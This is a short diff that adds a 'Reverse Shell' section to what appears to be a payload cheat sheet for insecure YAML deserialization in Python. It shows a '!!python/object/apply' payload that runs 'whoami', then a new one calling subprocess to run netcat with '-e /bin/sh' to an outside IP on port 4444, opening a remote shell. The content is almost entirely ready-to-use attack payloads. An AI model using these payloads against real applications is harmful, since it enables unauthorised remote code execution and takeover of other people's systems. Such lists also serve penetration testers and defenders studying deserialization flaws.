@@ -13,3 +13,13 @@
 ```bash
 !!python/object/apply:subprocess.check_output [["whoami"]] 
 ```
+
+
+### Reverse Shell
+
+
+```bash
+!!python/object/apply:subprocess.check_output
+  args:
+    - ['nc', '192.168.142.75', '4444', '-e', '/bin/sh']
+```
